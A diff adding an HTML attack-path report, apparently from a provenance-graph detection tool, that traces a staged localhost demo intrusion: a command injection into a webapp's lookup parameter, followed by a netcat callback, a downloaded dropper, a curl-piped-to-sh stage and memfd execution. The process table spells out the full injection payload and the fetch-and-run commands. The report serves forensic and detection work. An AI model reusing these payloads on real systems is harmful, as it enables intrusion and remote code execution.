@@ -1,0 +1,107 @@
+<!DOCTYPE html><html><head><meta charset='utf-8'><title>Attack path: proc 7352 sh</title><style>body{font-family:system-ui,sans-serif;margin:2rem;max-width:72rem;color:#1d2330}
+h1{font-size:1.4rem}h2{font-size:1.1rem;margin-top:1.6rem}.muted{color:#667}
+table{border-collapse:collapse;width:100%}td,th{padding:.3rem .5rem;border-bottom:1px solid #e3e6ec;text-align:left;
+vertical-align:top;font-size:.92rem}th{background:#f4f6fa}.t{font-variant-numeric:tabular-nums;white-space:nowrap;color:#556}
+.chip{display:inline-block;padding:.05rem .45rem;border-radius:.6rem;font-size:.85rem;white-space:nowrap}
+.proc{background:#e6efff}.file{background:#fff2d9}.sock{background:#e3f6ec}.op{font-weight:600;color:#334;font-size:.8rem}
+.alert{background:#fdecec;border-left:4px solid #c62828;padding:.4rem .7rem;margin:.3rem 0}
+code{font-size:.85rem;word-break:break-all}</style></head><body>
+<h1>Attack path: proc 7352 sh</h1>
+<p class='muted'>Start: <span class="chip proc">proc 7352 sh</span>. 41 nodes shown of 210 the walks reached; 0 files only read on the way and 169 earlier influences off the cause chain left out. Started under: sudo(7253) ← sudo(7251) ← bash(7239) ← bash(1338) ← sshd-session(1337) ← sshd-session(1232) ← sshd(1229) ← systemd(1).</p>
+<h2>Alerts on this path (6)</h2>
+<div class='alert'><b>R4 net-shell</b> <span class='t'>+0.001 s</span><br>pid 7320 python (network input from 127.0.0.1:8080 &lt;- 127.0.0.1:57084) started /bin/sh as pid 7352</div>
+<div class='alert'><b>R1 dropper</b> <span class='t'>+1.062 s</span><br>wrote /tmp/.k (pid 7355 curl), ran it as pid 7358</div>
+<div class='alert'><b>R1 dropper</b> <span class='t'>+1.112 s</span><br>wrote /memfd:kworker (deleted) (pid 7362 python3), ran it as pid 7363</div>
+<div class='alert'><b>R2 memfd-exec</b> <span class='t'>+1.112 s</span><br>pid 7363 ran /proc/self/fd/3 as kworker</div>
+<div class='alert'><b>R1 dropper</b> <span class='t'>+1.121 s</span><br>wrote /var/tmp/.upd-p15demo (pid 7362 python3), ran it as pid 7364</div>
+<div class='alert'><b>R3 deleted-exec</b> <span class='t'>+1.121 s</span><br>pid 7364 ran /proc/self/fd/4 as upd</div>
+<h2>Why it happened</h2><p class='muted'>From the start, the most recent cause of each step, newest first.</p><table><tr><th>time</th><th>caused by</th><th>how</th><th>this</th></tr>
+<tr><td class='t'>+0.000 s</td><td><span class="chip proc">proc 7320 python</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7352 sh</span></td></tr>
+<tr><td class='t'>-0.001 s</td><td><span class="chip sock">sock 127.0.0.1:8080 -&gt; 127.0.0.1:57084</span></td><td class='op'>RECV</td><td><span class="chip proc">proc 7320 python</span></td></tr>
+<tr><td class='t'></td><td><span class="chip sock">sock 127.0.0.1:57084 -&gt; 127.0.0.1:8080</span></td><td class='op'>TCP</td><td><span class="chip sock">sock 127.0.0.1:8080 -&gt; 127.0.0.1:57084</span></td></tr>
+<tr><td class='t'>-0.001 s</td><td><span class="chip proc">proc 7351 curl</span></td><td class='op'>SEND</td><td><span class="chip sock">sock 127.0.0.1:57084 -&gt; 127.0.0.1:8080</span></td></tr>
+<tr><td class='t'>-0.012 s</td><td><span class="chip proc">proc 7254 bash</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7351 curl</span></td></tr>
+<tr><td class='t'>-0.078 s</td><td><span class="chip file">file o:2222</span></td><td class='op'>READ</td><td><span class="chip proc">proc 7254 bash</span></td></tr>
+</table>
+<h2>What it led to, in order</h2><table><tr><th>time</th><th>from</th><th>what</th><th>to</th><th></th></tr>
+<tr><td class='t'>+0.000 s</td><td><span class="chip proc">proc 7320 python</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7352 sh</span></td><td class='t'></td></tr>
+<tr><td class='t'>+0.001 s</td><td><span class="chip file">file /usr/bin/dash</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7352 sh</span></td><td class='t'></td></tr>
+<tr><td class='t'>+0.004 s</td><td><span class="chip proc">proc 7352 sh</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7353 getent</span></td><td class='t'></td></tr>
+<tr><td class='t'>+0.006 s</td><td><span class="chip file">file /usr/bin/getent</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7353 getent</span></td><td class='t'></td></tr>
+<tr><td class='t'>+0.010 s</td><td><span class="chip proc">proc 7353 getent</span></td><td class='op'>CONNECT</td><td><span class="chip sock">sock 127.0.0.1:40718 -&gt; 127.0.0.53:53</span></td><td class='t'></td></tr>
+<tr><td class='t'>+0.010 s</td><td><span class="chip proc">proc 7353 getent</span></td><td class='op'>SEND</td><td><span class="chip sock">sock 127.0.0.1:40718 -&gt; 127.0.0.53:53</span></td><td class='t'> 38 B</td></tr>
+<tr><td class='t'>+0.010 s</td><td><span class="chip sock">sock 127.0.0.1:40718 -&gt; 127.0.0.53:53</span></td><td class='op'>RECV</td><td><span class="chip proc">proc 7353 getent</span></td><td class='t'> 66 B</td></tr>
+<tr><td class='t'>+0.010 s</td><td><span class="chip proc">proc 7353 getent</span></td><td class='op'>WRITE</td><td><span class="chip file">file o:2286</span></td><td class='t'> 26 B</td></tr>
+<tr><td class='t'>+0.010 s</td><td><span class="chip file">file o:2286</span></td><td class='op'>READ</td><td><span class="chip proc">proc 7320 python</span></td><td class='t'> 26 B</td></tr>
+<tr><td class='t'>+0.011 s</td><td><span class="chip proc">proc 7352 sh</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7354 nc</span></td><td class='t'></td></tr>
+<tr><td class='t'>+0.011 s</td><td><span class="chip file">file /usr/bin/nc.openbsd</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7354 nc</span></td><td class='t'></td></tr>
+<tr><td class='t'>+0.014 s</td><td><span class="chip proc">proc 7354 nc</span></td><td class='op'>CONNECT</td><td><span class="chip sock">sock 127.0.0.1:57868 -&gt; 127.0.0.1:4444</span></td><td class='t'></td></tr>
+<tr><td class='t'>+0.014 s</td><td><span class="chip sock">sock 127.0.0.1:4444 -&gt; 127.0.0.1:57868</span></td><td class='op'>ACCEPT</td><td><span class="chip proc">proc 7316 nc</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.029 s</td><td><span class="chip proc">proc 7352 sh</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7355 curl</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.030 s</td><td><span class="chip file">file /usr/bin/curl</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7355 curl</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.036 s</td><td><span class="chip proc">proc 7355 curl</span></td><td class='op'>CONNECT</td><td><span class="chip sock">sock 127.0.0.1:46508 -&gt; 127.0.0.1:8000</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.037 s</td><td><span class="chip sock">sock 127.0.0.1:8000 -&gt; 127.0.0.1:46508</span></td><td class='op'>ACCEPT</td><td><span class="chip proc">proc 7327 python</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.038 s</td><td><span class="chip proc">proc 7355 curl</span></td><td class='op'>SEND</td><td><span class="chip sock">sock 127.0.0.1:46508 -&gt; 127.0.0.1:8000</span></td><td class='t'> 79 B</td></tr>
+<tr><td class='t'>+1.038 s</td><td><span class="chip sock">sock 127.0.0.1:8000 -&gt; 127.0.0.1:46508</span></td><td class='op'>RECV</td><td><span class="chip proc">proc 7327 python</span></td><td class='t'> 79 B</td></tr>
+<tr><td class='t'>+1.043 s</td><td><span class="chip proc">proc 7327 python</span></td><td class='op'>WRITE</td><td><span class="chip file">file /var/tmp/p15-demo/stager.log</span></td><td class='t'>×2 123 B</td></tr>
+<tr><td class='t'>+1.044 s</td><td><span class="chip proc">proc 7327 python</span></td><td class='op'>SEND</td><td><span class="chip sock">sock 127.0.0.1:8000 -&gt; 127.0.0.1:46508</span></td><td class='t'>×47 11807310 B</td></tr>
+<tr><td class='t'>+1.044 s</td><td><span class="chip sock">sock 127.0.0.1:46508 -&gt; 127.0.0.1:8000</span></td><td class='op'>RECV</td><td><span class="chip proc">proc 7355 curl</span></td><td class='t'>×119 11807310 B</td></tr>
+<tr><td class='t'>+1.044 s</td><td><span class="chip file">file /tmp/.k</span></td><td class='op'>OPEN</td><td><span class="chip proc">proc 7355 curl</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.044 s</td><td><span class="chip proc">proc 7355 curl</span></td><td class='op'>WRITE</td><td><span class="chip file">file /tmp/.k</span></td><td class='t'>×1486 11807104 B</td></tr>
+<tr><td class='t'>+1.056 s</td><td><span class="chip proc">proc 7352 sh</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7357 chmod</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.057 s</td><td><span class="chip file">file /usr/lib/cargo/bin/coreutils/tee</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7357 chmod</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.061 s</td><td><span class="chip proc">proc 7352 sh</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7358 .k</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.062 s</td><td><span class="chip file">file /tmp/.k</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7358 .k</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.066 s</td><td><span class="chip proc">proc 7358 .k</span></td><td class='op'>WRITE</td><td><span class="chip file">file o:2377</span></td><td class='t'>×3 32 B</td></tr>
+<tr><td class='t'>+1.066 s</td><td><span class="chip file">file o:2377</span></td><td class='op'>READ</td><td><span class="chip proc">proc 7320 python</span></td><td class='t'>×11 249 B</td></tr>
+<tr><td class='t'>+1.067 s</td><td><span class="chip proc">proc 7352 sh</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7359 curl</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.067 s</td><td><span class="chip proc">proc 7352 sh</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7360 sh</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.067 s</td><td><span class="chip file">file /usr/bin/curl</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7359 curl</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.068 s</td><td><span class="chip file">file /usr/bin/dash</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7360 sh</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.070 s</td><td><span class="chip file">file o:2429</span></td><td class='op'>READ</td><td><span class="chip proc">proc 7360 sh</span></td><td class='t'> 563 B</td></tr>
+<tr><td class='t'>+1.074 s</td><td><span class="chip proc">proc 7359 curl</span></td><td class='op'>CONNECT</td><td><span class="chip sock">sock 127.0.0.1:46512 -&gt; 127.0.0.1:8000</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.074 s</td><td><span class="chip sock">sock 127.0.0.1:8000 -&gt; 127.0.0.1:46512</span></td><td class='op'>ACCEPT</td><td><span class="chip proc">proc 7327 python</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.074 s</td><td><span class="chip proc">proc 7359 curl</span></td><td class='op'>SEND</td><td><span class="chip sock">sock 127.0.0.1:46512 -&gt; 127.0.0.1:8000</span></td><td class='t'> 80 B</td></tr>
+<tr><td class='t'>+1.074 s</td><td><span class="chip sock">sock 127.0.0.1:8000 -&gt; 127.0.0.1:46512</span></td><td class='op'>RECV</td><td><span class="chip proc">proc 7327 python</span></td><td class='t'> 80 B</td></tr>
+<tr><td class='t'>+1.075 s</td><td><span class="chip proc">proc 7327 python</span></td><td class='op'>SEND</td><td><span class="chip sock">sock 127.0.0.1:8000 -&gt; 127.0.0.1:46512</span></td><td class='t'>×2 764 B</td></tr>
+<tr><td class='t'>+1.075 s</td><td><span class="chip sock">sock 127.0.0.1:46512 -&gt; 127.0.0.1:8000</span></td><td class='op'>RECV</td><td><span class="chip proc">proc 7359 curl</span></td><td class='t'> 764 B</td></tr>
+<tr><td class='t'>+1.075 s</td><td><span class="chip proc">proc 7359 curl</span></td><td class='op'>WRITE</td><td><span class="chip file">file o:2429</span></td><td class='t'> 563 B</td></tr>
+<tr><td class='t'>+1.076 s</td><td><span class="chip proc">proc 7360 sh</span></td><td class='op'>WRITE</td><td><span class="chip file">file o:2432</span></td><td class='t'> 477 B</td></tr>
+<tr><td class='t'>+1.076 s</td><td><span class="chip proc">proc 7360 sh</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7362 python3</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.076 s</td><td><span class="chip file">file /usr/bin/python3.14</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7362 python3</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.090 s</td><td><span class="chip file">file o:2432</span></td><td class='op'>READ</td><td><span class="chip proc">proc 7362 python3</span></td><td class='t'> 477 B</td></tr>
+<tr><td class='t'>+1.100 s</td><td><span class="chip file">file /usr/lib/cargo/bin/coreutils/tee</span></td><td class='op'>OPEN</td><td><span class="chip proc">proc 7362 python3</span></td><td class='t'>×2</td></tr>
+<tr><td class='t'>+1.100 s</td><td><span class="chip file">file /usr/lib/cargo/bin/coreutils/tee</span></td><td class='op'>READ</td><td><span class="chip proc">proc 7362 python3</span></td><td class='t'> 11807104 B</td></tr>
+<tr><td class='t'>+1.106 s</td><td><span class="chip proc">proc 7362 python3</span></td><td class='op'>WRITE</td><td><span class="chip file">file /memfd:kworker (deleted)</span></td><td class='t'> 11807104 B</td></tr>
+<tr><td class='t'>+1.111 s</td><td><span class="chip proc">proc 7362 python3</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7363 3 [kworker]</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.112 s</td><td><span class="chip file">file /memfd:kworker (deleted)</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7363 3 [kworker]</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.115 s</td><td><span class="chip proc">proc 7363 3 [kworker]</span></td><td class='op'>WRITE</td><td><span class="chip file">file o:2377</span></td><td class='t'>×5 107 B</td></tr>
+<tr><td class='t'>+1.116 s</td><td><span class="chip file">file /var/tmp/.upd-p15demo</span></td><td class='op'>OPEN</td><td><span class="chip proc">proc 7362 python3</span></td><td class='t'>×2</td></tr>
+<tr><td class='t'>+1.121 s</td><td><span class="chip proc">proc 7362 python3</span></td><td class='op'>CLONE</td><td><span class="chip proc">proc 7364 4 [upd]</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.121 s</td><td><span class="chip file">file /var/tmp/.upd-p15demo</span></td><td class='op'>EXECUTE</td><td><span class="chip proc">proc 7364 4 [upd]</span></td><td class='t'></td></tr>
+<tr><td class='t'>+1.125 s</td><td><span class="chip proc">proc 7364 4 [upd]</span></td><td class='op'>WRITE</td><td><span class="chip file">file o:2377</span></td><td class='t'>×5 110 B</td></tr>
+<tr><td class='t'>+1.136 s</td><td><span class="chip proc">proc 7320 python</span></td><td class='op'>WRITE</td><td><span class="chip file">file /var/tmp/p15-demo/webapp.log</span></td><td class='t'> 265 B</td></tr>
+<tr><td class='t'>+1.136 s</td><td><span class="chip proc">proc 7320 python</span></td><td class='op'>SEND</td><td><span class="chip sock">sock 127.0.0.1:8080 -&gt; 127.0.0.1:57084</span></td><td class='t'>×2 144 B</td></tr>
+<tr><td class='t'>+1.137 s</td><td><span class="chip sock">sock 127.0.0.1:57084 -&gt; 127.0.0.1:8080</span></td><td class='op'>RECV</td><td><span class="chip proc">proc 7351 curl</span></td><td class='t'> 144 B</td></tr>
+<tr><td></td><td><span class="chip sock">sock 127.0.0.1:57084 -&gt; 127.0.0.1:8080</span></td><td class='op'>TCP</td><td><span class="chip sock">sock 127.0.0.1:8080 -&gt; 127.0.0.1:57084</span></td><td class='t'>one connection</td></tr>
+<tr><td></td><td><span class="chip sock">sock 127.0.0.1:46508 -&gt; 127.0.0.1:8000</span></td><td class='op'>TCP</td><td><span class="chip sock">sock 127.0.0.1:8000 -&gt; 127.0.0.1:46508</span></td><td class='t'>one connection</td></tr>
+<tr><td></td><td><span class="chip sock">sock 127.0.0.1:46512 -&gt; 127.0.0.1:8000</span></td><td class='op'>TCP</td><td><span class="chip sock">sock 127.0.0.1:8000 -&gt; 127.0.0.1:46512</span></td><td class='t'>one connection</td></tr>
+<tr><td></td><td><span class="chip sock">sock 127.0.0.1:57868 -&gt; 127.0.0.1:4444</span></td><td class='op'>TCP</td><td><span class="chip sock">sock 127.0.0.1:4444 -&gt; 127.0.0.1:57868</span></td><td class='t'>one connection</td></tr>
+</table><h2>The processes</h2><table>
+<tr><td><code>proc 7254 bash (bash tools/demo/run_demo.sh /var/tmp/p15-demo)</code></td></tr>
+<tr><td><code>proc 7316 nc (nc -l 127.0.0.1 4444)</code></td></tr>
+<tr><td><code>proc 7320 python (/home/ashu/p15venv/bin/python tools/demo/webapp.py 8080)</code></td></tr>
+<tr><td><code>proc 7327 python (/home/ashu/p15venv/bin/python -m http.server 8000 --bind 127.0.0.1 --directory /var/tmp/p15-demo/stager)</code></td></tr>
+<tr><td><code>proc 7351 curl (curl -s http://127.0.0.1:8080/lookup?name=localhost%3Bnc%20-w1%20127.0.0.1%204444%20%3C%2Fdev%2Fnull%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fk%20-o%20%2Ftmp%2F.k%3Bchmod%20%2Bx%20%2Ftmp%2F.k%3B%2Ftmp%2F.k%3Bcurl%20-s%20http%3A%2F%2F127.0.0.1%3A8000%2Fs2%7Csh)</code></td></tr>
+<tr><td><code>proc 7352 sh (/bin/sh -c getent hosts localhost;nc -w1 127.0.0.1 4444 &lt;/dev/null;curl -s http://127.0.0.1:8000/k -o /tmp/.k;chmod +x /tmp/.k;/tmp/.k;curl -s http://127.0.0.1:8000/s2|sh)</code></td></tr>
+<tr><td><code>proc 7353 getent (getent hosts localhost)</code></td></tr>
+<tr><td><code>proc 7354 nc (nc -w1 127.0.0.1 4444)</code></td></tr>
+<tr><td><code>proc 7355 curl (curl -s http://127.0.0.1:8000/k -o /tmp/.k)</code></td></tr>
+<tr><td><code>proc 7357 chmod (chmod +x /tmp/.k)</code></td></tr>
+<tr><td><code>proc 7358 .k (/tmp/.k)</code></td></tr>
+<tr><td><code>proc 7359 curl (curl -s http://127.0.0.1:8000/s2)</code></td></tr>
+<tr><td><code>proc 7360 sh (sh)</code></td></tr>
+<tr><td><code>proc 7362 python3 (python3 -)</code></td></tr>
+<tr><td><code>proc 7363 3 (kworker)</code></td></tr>
+<tr><td><code>proc 7364 4 (upd)</code></td></tr>
+</table><p class='muted'>Made by p15.graph.story from the capture's graph: the walks are BackTracker's rule over time-stamped edges (p15.graph.track); alerts are p15.graph.rules.</p></body></html>
